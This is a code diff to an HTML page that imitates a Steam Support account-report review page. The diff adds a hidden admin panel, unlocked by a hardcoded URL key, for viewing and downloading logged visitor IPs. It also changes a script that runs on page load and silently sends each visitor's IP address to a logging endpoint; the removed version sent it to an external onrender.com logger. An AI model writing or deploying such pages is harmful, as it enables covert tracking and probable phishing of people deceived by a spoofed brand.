@@ -89,10 +89,20 @@
       gap: 12px;
     }
     .footer-box img { width: 40px; height: 40px; border-radius: 3px; }
+    .admin-log {
+      white-space: pre-wrap;
+      background: #111c2a;
+      border: 1px solid var(--border);
+      padding: 20px;
+      border-radius: 6px;
+      margin-top: 20px;
+      font-size: 14px;
+      color: #9fc9f7;
+    }
   </style>
 </head>
 <body>
-  <div class="container">
+  <div class="container" id="main-content">
     <div class="top-title">Steam Support</div>
     <div class="breadcrumb">Home > My Recent Help Requests > 계정 신고 검토</div>
 
@@ -129,25 +139,45 @@
     </div>
   </div>
 
-  <!-- IP 기록 기능 -->
+  <div class="container" id="admin-log" style="display:none;">
+    <div class="top-title">📋 방문자 IP 기록</div>
+
+    <!-- ✅ CSV 다운로드 링크 추가 -->
+    <a href="/ips.csv?key=damin-secret" style="color:var(--accent); font-size:14px;">📥 CSV 다운로드</a>
+
+    <div class="admin-log" id="log-output">불러오는 중...</div>
+  </div>
+
   <script>
-    async function sendIP() {
-      try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const data = await res.json();
+    const params = new URLSearchParams(location.search);
+    const isAdmin = params.get("admin") === "damin-secret";
 
-        await fetch("https://ip-logger-1.onrender.com/log-ip", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ ip: data.ip })
+    if (isAdmin) {
+      document.getElementById("main-content").style.display = "none";
+      document.getElementById("admin-log").style.display = "block";
+
+      fetch("/ips?key=damin-secret")
+        .then(res => res.text())
+        .then(data => {
+          document.getElementById("log-output").textContent = data || "기록 없음";
+        })
+        .catch(err => {
+          document.getElementById("log-output").textContent = "불러오기 실패: " + err;
         });
-
-        console.log("방문자 IP:", data.ip);
-      } catch (err) {
-        console.error("IP 전송 실패:", err);
-      }
+    } else {
+      fetch("https://api64.ipify.org?format=json")
+        .then(res => res.json())
+        .then(data => {
+          return fetch("/log-ip", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ ip: data.ip })
+          });
+        })
+        .then(res => res.text())
+        .then(msg => console.log("IP 전송 성공:", msg))
+        .catch(err => console.error("IP 전송 실패:", err));
     }
-    sendIP();
   </script>
 </body>
 </html>
